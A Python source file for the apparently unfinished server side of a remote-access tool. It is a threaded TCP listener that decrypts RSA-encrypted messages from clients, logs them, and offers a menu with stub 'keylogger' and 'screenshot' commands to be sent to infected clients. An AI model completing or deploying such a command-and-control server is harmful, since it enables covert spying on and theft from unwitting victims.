import socket
import threading
import json
from os import getenv
from dotenv import load_dotenv
import sys
from datetime import datetime
import pytz
from logger import get_logger
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import base64
# TO DO LIST

# generalize input handling
# add file download upload
# encrypt the connection
# beautify terminal
# make it for multiple clients
# send commands to the client side to start the modules

logger = get_logger()

# Load .env    
load_dotenv()
LHOST = str(getenv("LHOST","localhost"))
LPORT = int(getenv("LPORT", "1911"))
RECV_SIZE = int(getenv("RECV_SIZE","1024"))
ENCODING = str(getenv("ENCODING","utf-8"))
OUT_FILE=str(getenv("OUT_FILE","output"))
OUTPUT_FORMAT=str(getenv("OUTPUT_FORMAT","CLF")) # Options: CLF, JSON (to-do)
"""
CLF Log Format Sample
192.168.122.16 - john [10/Oct/2000:13:55:36 -0700] "PRESS D" 768
<src_addr> - <user or agent name> <time_stamp> <action> <bytes_sent>

JSON Log Format Sample
TO-DO
"""
OUTPUT_TIMEZONE=str(getenv("OUTPUT_TIMEZONE","UTC"))
PROMPT = getenv("PROMPT","$ ")
PRIVATE_KEY_PATH=str(getenv("PRIVATE_KEY_PATH","private.pem"))


logger.debug(f"LHOST={LHOST}")
logger.debug(f"LPORT={LPORT}")
logger.debug(f"RECV_SIZE={RECV_SIZE}")
logger.debug(f"ENCODING={ENCODING}")
logger.debug(f"OUT_FILE={OUT_FILE}")
logger.debug(f"OUTPUT_TIMEZONE={OUTPUT_TIMEZONE}")

def get_rsa_chiper(private_key_path:str=PRIVATE_KEY_PATH):
    with open(private_key_path, "rb") as f:
        private_key = RSA.import_key(f.read())
    cipher_rsa = PKCS1_OAEP.new(private_key)
    return cipher_rsa

rsa_chipher=get_rsa_chiper()
# connection handler
def handle_client(client_socket, addr,encoding:str=ENCODING,recv_size:int=RECV_SIZE):
    logger.info(f"\nConnection from {addr}")
    try:
        while True:
            data = client_socket.recv(recv_size)
            if not data:
                break
            logger.debug(f"DATA SIZE = {len(data)}")
            try:
                decrypted = rsa_chipher.decrypt(base64.b64decode(data))
                message = decrypted.decode(ENCODING)
                logger.info(f"\nReceived from {addr}: {message}\n")
            except Exception as e:
                logger.error(f"RSA decrypt error: {e}")

    except Exception as e:
        logger.error(f"Error with client {addr}: {e}")
    finally:
        client_socket.close()
        logger.info(f"Connection with {addr} closed")


def out_new_line(addr:str,
                 message:str,
                 size:int,
                 outfile:str=OUT_FILE,
                 format:str=OUTPUT_FORMAT,
                 time_zone:str=OUTPUT_TIMEZONE
                 ):
    """
    addr -> addr from handle_client
    message -> data.encode(ENCODING) from handle_client
    size -> len(data) from handle_client
    """
    with open(outfile,"a") as file:
        match format:
            case "CLF":
                timezone = pytz.timezone(time_zone)
                now_utc = datetime.now(timezone)
                clf_time = now_utc.strftime('[%d/%b/%Y:%H:%M:%S %z]')
                line = f"{addr} - john {clf_time} {message} {size}"
                file.write(f"{line}\n")
            case "JSON":
                # TO-DO
                pass
            case _:
                print("""
                Invalid output format 
                Avaliable log formats
                    - CLF
                    - JSON
                """
                )

# initialize server
def start_server(lhost:str=LHOST,lport:int=LPORT):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        lport = int(lport)
    except ValueError:
        logger.error("Invalid LPORT number. Please enter a valid integer.")
        return
    if lport < 1024:
        logger.warning("You must start the program as root to use LPORT 1024 and gold.")
        logger.warning("If the program does not work, change the LPORT number to a value greater than 1024.")
        return
    elif lport > 65535:
        logger.error("Port number must be lower than 65535")
        return
    server.bind((lhost, lport))
    server.listen(5)

    logger.info(f"\nTCP Server listening on {lhost}:{lport}\n")

    try:
        while True:
            client_socket, addr = server.accept()
            client_thread = threading.Thread(target=handle_client, args=(client_socket, addr))
            client_thread.daemon = True
            client_thread.start()
    except KeyboardInterrupt:
        logger.info("\nServer shutting down...")
    finally:
        server.close()

# terminal commands
def terminal(args):
    def help_command():
        logger.info(f"Available commands: {', '.join(commands.keys())}")

    def keylogger_command():
        logger.info("keylogger started")
        # will send command to the client side to start the keylogger module

    def screenshot_command():
        logger.info("screenshot started")
        # will send command to the client side to start the screenshot module

    def exit_command():
        logger.info("Goodbye.")
        sys.exit(0)

    commands = {
        "help": help_command,
        "keylogger": keylogger_command,
        "screenshot": screenshot_command,
        "exit": exit_command,
        "back": lambda: logger.info("Returning to main menu..."),
    }

    command = commands.get(args)
    if command:
        command()
    else:
        logger.error(f"Invalid command. Available commands: {', '.join(commands.keys())}")
                
# working on it
def send_command_to_client(client_socket, command,encoding:str=ENCODING):
    try:
        client_socket.send(json.dumps(command).encode(encoding))
    except Exception as e:
        logger.error(f"Failed to send command: {e}")

def main_menu(prompt:str=PROMPT):
    print(r"""
    
    ___          ___    _  _____
  ,' _/ /7 _ __ / o | .' \/_  _/
 _\ `. //_7\V //  ,' / o / / /  
/___,'//\\  )//_/`_\/_n_/ /_/   
           //                   

Type 'shell' to start the terminal interface.
Type 'exit' to quit the server.
    """)

    # Start server listener
    listening_thread = threading.Thread(target=start_server, daemon=True)
    listening_thread.start()

    try:
        while True:
            menu_input = input()
            if menu_input == "shell":
                while True:
                    # Terminal input loop
                    try:
                        user_command = input(f"\n{prompt}")
                        if user_command == "back":
                            terminal("back")
                            break
                        terminal(user_command)
                    except KeyboardInterrupt:
                        logger.info("\n[!] Interrupted. Exiting...")
                        break
            elif menu_input == "exit":
                terminal("exit")
            else:
                logger.error("Invalid command. Type 'shell' to enter the terminal interface or 'exit' to quit the server.")
                continue
    finally:
        pass

if __name__ == "__main__":
    main_menu()
